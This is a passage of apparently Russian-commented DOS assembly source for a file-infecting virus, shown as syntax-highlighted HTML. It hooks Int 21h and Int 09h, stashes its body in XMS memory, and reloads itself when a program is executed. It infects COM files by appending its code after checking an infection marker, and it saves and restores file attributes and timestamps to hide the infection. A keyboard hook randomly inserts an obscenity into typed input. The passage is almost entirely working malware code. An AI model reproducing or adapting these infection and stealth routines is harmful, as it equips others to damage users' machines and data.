        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc10">$</span><span class="sc0">


</span><span class="sc1">;[Помечаем блок памяти как системную область]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Копируем Loader в выделенную память]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LoaderSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Loader</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc5">msr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем свой обработчик Int 21h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc5">msr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем свой обработчик Int 09h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2509h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int09h</span><span class="sc4">-</span><span class="sc5">Loader</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Exit</span><span class="sc10">$</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Структура для пересылки данных из DOS-памяти в XMS]</span><span class="sc0">

</span><span class="sc5">DOStoXMS</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">CodeSize</span><span class="sc0">    </span><span class="sc1">; +00h длина пересылаемых данных</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; +04h должно быть равно нулю</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; +06h смещение данных в DOS-памяти</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; +08h сегмент данных в DOS-памяти</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; +0Ah номер целевого XMS-блока</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; +0Ch смещение в целевом XMS-блоке </span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                                LOADER</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Loader</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotTest</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc5">NotTest</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4B00h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Quit21h</span><span class="sc0">


</span><span class="sc1">;[Выделяем память для вируса]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirMem</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Quit21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">XMStoDOS</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">-</span><span class="sc5">Loader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Помечаем блок памяти как системную область]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Копируем вирус из XMS в базовую память]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XMStoDOS</span><span class="sc4">-</span><span class="sc5">Loader</span><span class="sc0">
        </span><span class="sc5">msr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9Ah</span><span class="sc0">
</span><span class="sc5">DrXMS</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FreeMem</span><span class="sc0">


</span><span class="sc1">;[Отдаем вирусу управление]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FreeMem</span><span class="sc4">-</span><span class="sc5">Loader</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">


</span><span class="sc1">;[Освобождаем блок в базовой памяти]</span><span class="sc0">

</span><span class="sc5">FreeMem</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление дальше по цепочке]</span><span class="sc0">

</span><span class="sc5">Quit21h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">Ofs21h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Seg21h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;[Структура для пересылки данных из XMS в DOS-память]</span><span class="sc0">

</span><span class="sc5">XMStoDOS</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">CodeSize</span><span class="sc0">    </span><span class="sc1">; +00h длина пересылаемых данных</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; +04h номер XMS-блока</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; +06h смещение данных в XMS-блоке</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; +0Ah должно быть равно нулю</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; +0Ch целевое смещение в DOS-памяти</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; +0Eh целевой сегмент в DOS-памяти</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Int09h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">


</span><span class="sc1">;[Проверяем, какую клавшу нажал юзер]</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Quit09h</span><span class="sc0">


</span><span class="sc1">;[Вероятность выполнения заподла]</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Quit09h</span><span class="sc0">


</span><span class="sc1">;[Записываем в буффер слово ", бля"]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">L3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Bla</span><span class="sc4">-</span><span class="sc5">Loader</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Quit09h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L3</span><span class="sc0">

</span><span class="sc5">Quit09h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">Ofs09h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Seg09h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Bla</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">', бля'</span><span class="sc0">

</span><span class="sc5">LoaderSize</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Loader</span><span class="sc0">
</span><span class="sc5">LoaderMem</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">LoaderSize</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                          ОБРАБОТЧИК INT 21h</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Int24h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc5">Int21h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Сохраняем вектор Int 24h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем свой обработчик Int 24h]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int24h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc5">msr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Сохраняем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Обнуляем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttr</span><span class="sc0">


</span><span class="sc1">;[Открываем файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttr</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Сохраняем время дату и время создания файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;[Считываем первые три байта]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Old3b</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc5">msr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">
        

</span><span class="sc1">;[Проверяем тип файла]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old3b</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ComFile</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Восстанавливаем дату и время создания файла]</span><span class="sc0">

</span><span class="sc5">RestTime</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Закрываем файл]</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем атрибуты файла]</span><span class="sc0">

</span><span class="sc5">RestAttr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем вектор Int 24h]</span><span class="sc0">

</span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Устанавливаем указатель на 7 позиций от конца файла]</span><span class="sc0">

</span><span class="sc5">ComFile</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFF9h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Считываем 7 байт]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Проверяем зараженность файла и корректируем XXXNS]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ЛБ'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">XXXNS</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель в конец файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Проверяем длину файла и вычисляем адрес перехода]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FF00h</span><span class="sc4">-</span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">New3b</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Копируем вирус в буффер]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
